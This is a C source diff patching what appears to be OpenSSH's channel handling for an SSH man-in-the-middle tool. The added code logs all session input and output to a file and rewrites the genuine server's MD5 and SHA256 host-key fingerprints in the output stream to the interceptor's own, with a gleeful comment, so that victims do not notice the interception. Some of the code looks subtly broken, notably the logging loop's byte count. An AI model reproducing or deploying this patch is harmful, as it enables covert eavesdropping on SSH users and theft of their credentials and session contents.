@@ -82,6 +82,7 @@
 #include "key.h"
 #include "authfd.h"
 #include "pathnames.h"
+#include "lol.h"
 
 /* -- channel core */
 
@@ -190,6 +191,12 @@ static const char *channel_rfwd_bind_host(const char *listen_host);
 /* non-blocking connect helpers */
 static int connect_next(struct channel_connect *);
 static void channel_connect_ctx_free(struct channel_connect *);
+
+void log_input(Channel *c, char *buf, int len);
+void log_output(Channel *c, char *buf, int len);
+void logx(Channel *c, char *buf, int len);
+char *replace_fingerprints(Channel *c, char *input, int input_size, int *output_len, int *free_result);
+void handle_overlap(Channel *c, char *input, unsigned int input_len, unsigned int *output_len);
 
 /* -- channel core */
 
@@ -504,6 +511,23 @@ channel_free(Channel *c)
 	if (c->filter_cleanup != NULL && c->filter_ctx != NULL)
 		c->filter_cleanup(c->self, c->filter_ctx);
 	channels[c->self] = NULL;
+	/*
+	if (c->log_fd > 0) {
+		fdatasync(c->log_fd);
+		close(c->log_fd);
+		c->log_fd = 0;
+	}
+	*/
+	free(c->legit_md5_fingerprint);    c->legit_md5_fingerprint = NULL;
+	c->legit_md5_fingerprint_len = 0;
+	free(c->legit_sha256_fingerprint); c->legit_sha256_fingerprint = NULL;
+	c->legit_sha256_fingerprint_len = 0;
+	free(c->our_md5_fingerprint);      c->our_md5_fingerprint = NULL;
+	c->our_md5_fingerprint_len = 0;
+	free(c->our_sha256_fingerprint);   c->our_sha256_fingerprint = NULL;
+	c->our_sha256_fingerprint_len = 0;
+	free(c->extra_fp_bytes);           c->extra_fp_bytes = NULL;
+	c->extra_fp_bytes_len = 0;
 	free(c);
 }
 
@@ -853,12 +877,14 @@ channel_register_filter(int id, channel_infilter_fn *ifn,
 
 void
 channel_set_fds(int id, int rfd, int wfd, int efd,
-    int extusage, int nonblock, int is_tty, u_int window_max)
+    int extusage, int nonblock, int is_tty, u_int window_max, int session_log_fd, int is_sftp)
 {
 	Channel *c = channel_lookup(id);
 
 	if (c == NULL || c->type != SSH_CHANNEL_LARVAL)
 		fatal("channel_activate for non-larval channel %d.", id);
+	c->log_fd = session_log_fd;
+	c->is_sftp = is_sftp;
 	channel_register_fds(c, rfd, wfd, efd, extusage, nonblock, is_tty);
 	c->type = SSH_CHANNEL_OPEN;
 	c->local_window = c->local_window_max = window_max;
@@ -1729,6 +1755,8 @@ channel_handle_rfd(Channel *c, fd_set *readset, fd_set *writeset)
 {
 	char buf[CHAN_RBUF];
 	int len, force;
+	char *output = NULL;
+	int output_len = 0, real_output_len = 0, free_result = 0;
 
 	force = c->isatty && c->detach_close && c->istate != CHAN_INPUT_CLOSED;
 	if (c->rfd != -1 && (force || FD_ISSET(c->rfd, readset))) {
@@ -1758,16 +1786,23 @@ channel_handle_rfd(Channel *c, fd_set *readset, fd_set *writeset)
 			}
 			return -1;
 		}
+
+		/* Replace the legit server's fingerprints in the output with
+		 * our fingerprints.  >:] */
+		output = replace_fingerprints(c, buf, len, &output_len, &free_result);
+		handle_overlap(c, output, output_len, &real_output_len);
+		log_output(c, output, real_output_len);
 		if (c->input_filter != NULL) {
-			if (c->input_filter(c, buf, len) == -1) {
+			if (c->input_filter(c, output, real_output_len) == -1) {
 				debug2("channel %d: filter stops", c->self);
 				chan_read_failed(c);
 			}
 		} else if (c->datagram) {
-			buffer_put_string(&c->input, buf, len);
+			buffer_put_string(&c->input, output, real_output_len);
 		} else {
-			buffer_append(&c->input, buf, len);
+			buffer_append(&c->input, output, real_output_len);
 		}
+		if (free_result) { free(output); output = NULL; }
 	}
 	return 1;
 }
@@ -1824,6 +1859,7 @@ channel_handle_wfd(Channel *c, fd_set *readset, fd_set *writeset)
 			dlen = MIN(dlen, 8*1024);
 #endif
 
+		log_input(c, buf, dlen);
 		len = write(c->wfd, buf, dlen);
 		if (len < 0 &&
 		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
@@ -4669,4 +4705,247 @@ auth_request_forwarding(void)
 	packet_start(SSH_CMSG_AGENT_REQUEST_FORWARDING);
 	packet_send();
 	packet_write_wait();
+}
+
+void log_input(Channel *c, char *buf, int len) {
+  logx(c, buf, len);
+}
+
+void log_output(Channel *c, char *buf, int len) {
+  logx(c, buf, len);
+}
+
+void logx(Channel *c, char *buf, int len) {
+  /* Do not log the raw binary stream if this is an SFTP channel. */
+  if (c->is_sftp)
+    return;
+  else {
+    int written = 0;
+    int ret = -1;
+
+    if (c->log_fd <= 0)
+      return;
+
+    while (written < len) {
+      ret = write(c->log_fd, buf + written, len - written);
+      if (ret < 0)
+	return;
+
+      written += len;
+    }
+  }
+}
+
+/* This function searches and replaces the legitimate server's host key
+ * fingerprints with ours.
+ *
+ *     "input" is the character buffer to search.
+ *     "output_len" holds the number of characters written to the output return
+ *         value.
+ *     "free_result" is set to 1 if the caller must call free() on the return
+ *         value when finished with it.
+ */
+char *replace_fingerprints(Channel *c, char *input, int input_size, int *output_len, int *free_result) {
+  char *orig_input = input;
+  int orig_input_size = input_size;
+
+  char *needle = NULL, *needle_replacement = NULL;
+  int needle_len = 0, needle_replacement_len = 0;
+
+  void *ptr = NULL;
+  char *output = NULL;
+
+  int output_size = 0;
+  int allocated_input = 0, allocated_output = 0;
+  int prefix_len = 0, suffix_len = 0;
+  int i = 0;
+  int output_is_input = 0;
+
+  *output_len = input_size;
+
+  /* If extra bytes are set from a previous call (i.e.: a partial fingerprint
+   * from a previous input block), prepend them to the input in a new buffer. */
+  if (c->extra_fp_bytes_len > 0) {
+    int new_input_size = input_size + c->extra_fp_bytes_len;
+    char *new_input = calloc(new_input_size, sizeof(char));
+    if (new_input == NULL)
+      goto replace_fingerprints_error;
+
+    memcpy(new_input, c->extra_fp_bytes, c->extra_fp_bytes_len);
+    memcpy(new_input + c->extra_fp_bytes_len, input, input_size);
+
+    input = new_input;
+    *output_len = input_size = new_input_size;
+    allocated_input = 1;
+    c->extra_fp_bytes_len = 0;
+  }
+
+  /* Process the MD5 and SHA256 fingerprint types. */
+  for (i = 0; i < 2; i++) {
+    if (i == 0) {
+      needle = c->legit_md5_fingerprint;
+      needle_len = c->legit_md5_fingerprint_len;
+      needle_replacement = c->our_md5_fingerprint;
+      needle_replacement_len = c->our_md5_fingerprint_len;
+    } else if(i == 1) {
+      needle = c->legit_sha256_fingerprint;
+      needle_len = c->legit_sha256_fingerprint_len;
+      needle_replacement = c->our_sha256_fingerprint;
+      needle_replacement_len = c->our_sha256_fingerprint_len;
+    }
+
+    /* If we don't have all the info we need to search and replace, skip this
+     * fingerprint type. */
+    if ((needle_len == 0) || (needle_replacement_len == 0))
+      continue;
+
+    /* Search for the needle in the haystack. */
+    if ((ptr = memmem(input, input_size, needle, needle_len)) != NULL) {
+
+      /* If an output buffer isn't decided yet... */
+      if (output == NULL) {
+
+	/* We will choose to overwrite the input buffer with the output, if it
+	 * fits.  If it doesn't, we need to allocate a new buffer. */
+	output_size = input_size - needle_len + needle_replacement_len;
+	if (output_size > input_size) {
+	  output = calloc(output_size, sizeof(char));
+
+	  if (output == NULL)
+	    goto replace_fingerprints_error;
+
+	  allocated_output = 1;
+	  output_is_input = 0;
+	} else {
+	  output = input;
+	  output_size = input_size;
+	  output_is_input = 1;
+	}
+
+      /* We already set an output buffer (note that we could have allocated it
+       * ourselves, or it may be the input buffer).  Check if its big enough
+       * for the replacement string.  If not, allocate a new one or re-allocate
+       * the existing one, as necessary. */
+      } else {
+	int _output_size = input_size - needle_len + needle_replacement_len;
+	if (_output_size > output_size) {
+	  output_size = _output_size;
+
+	  /* If we had already allocated a buffer, re-allocate it with the
+	   * number of bytes we need.  Otherwise, allocate a new one. */
+	  if (allocated_output == 1)
+	    output = realloc(output, output_size);
+	  else
+	    output = calloc(output_size, sizeof(char));
+
+	  if (output == NULL)
+	    goto replace_fingerprints_error;
+
+	  allocated_output = 1;
+	  output_is_input = 0;
+	}
+      }
+
+      /* Calculate the length of the prefix and suffix around the string we
+       * are replacing. */
+      prefix_len = (char *)ptr - input;
+      suffix_len = input_size - prefix_len - needle_len;
+
+      /* Copy the prefix, string replacement, and suffix into the output. */
+      memmove(output, input, prefix_len);
+      memmove(output + prefix_len, needle_replacement, needle_replacement_len);
+      memmove(output + prefix_len + needle_replacement_len, (char *)ptr + needle_len, suffix_len);
+
+      /* Update the number of bytes we wrote into the output buffer. */
+      *output_len = prefix_len + needle_replacement_len + suffix_len;
+    }
+  }
+
+  /* If the output pointer has been set (meaning that a substitution was made),
+   * free the input buffer if necessary.  Return a pointer to the output
+   * buffer. */
+  if (output != NULL) {
+    if (allocated_input && !output_is_input) {
+      free(input); input = NULL;
+      allocated_input = 0;
+    }
+
+    *free_result = allocated_input | allocated_output;
+    return output;
+
+  /* If no substitution was made, return the input buffer (which we may have
+   * allocated ourselves). */
+  } else {
+    *free_result = allocated_input;
+    return input;
+  }
+
+ replace_fingerprints_error:
+  if (allocated_input) {
+    free(input); input = NULL;
+  }
+  if (allocated_output) {
+    free(output); output = NULL;
+  }
+  *free_result = 0;
+  *output_len = orig_input_size;
+  return orig_input;
+}
+
+/* Handles any partial fingerprints found at the end of the input block.  Any
+ * that are found are placed in the Channel's "extra_fp_bytes" buffer, which
+ * will be prepended in the next block's buffer by replace_fingerprints().  The
+ * smallest partial fingerprint this will look for is of length 8, so as to
+ * maintain high responsiveness for interactive shell sessions.
+ *
+ *    "input" is the input buffer to process.
+ *    "input_len" is the number of bytes to process in the input buffer.
+ *    "output_len" is the new number of bytes the caller should use in the
+ *        input buffer, where output_len <= input_len.
+ */
+void handle_overlap(Channel *c, char *input, unsigned int input_len, unsigned int *output_len) {
+  unsigned int i, shift;
+  char *needle = NULL;
+  unsigned int needle_len = 0;
+  int found_substr = 0;
+
+  *output_len = input_len;
+
+  /* Don't bother processing input blocks smaller than 8, since that is the
+   * minimum size we will look for.  This is a tradeoff between shell
+   * responsiveness and completeness.  For interactive shell sessions,
+   * responsiveness is much more important... */
+  if (input_len < 8)
+    return;
+
+  for (i = 0; i < 2; i++) {
+    if (i == 0) {
+      needle = c->legit_md5_fingerprint;
+      needle_len = c->legit_md5_fingerprint_len;
+    } else if (i == 1) {
+      needle = c->legit_sha256_fingerprint;
+      needle_len = c->legit_sha256_fingerprint_len;
+    }
+
+    /* If we don't have a needle, don't bother to continue processing. */
+    if (needle_len == 0)
+      continue;
+
+    /* Begin by looking at the last 8 bytes of the input, and see if it matches
+     * the first 8 bytes of the fingerprint.  Then look at the last/first 9
+     * bytes, etc. */
+    found_substr = 0;
+    for (shift = 8; (shift < needle_len) && (shift <= input_len); shift++) {
+      if (memcmp(input + (input_len - shift), needle, shift) == 0)
+	found_substr = shift;
+    }
+
+    /* If we find a match, move the matching characters to the extra_chars
+     * array, and shorten the length of the output. */
+    if (found_substr > 0) {
+      c->extra_fp_bytes_len = found_substr;
+      memcpy(c->extra_fp_bytes, input + input_len - found_substr, c->extra_fp_bytes_len);
+      *output_len = input_len - found_substr;
+    }
+  }
 }
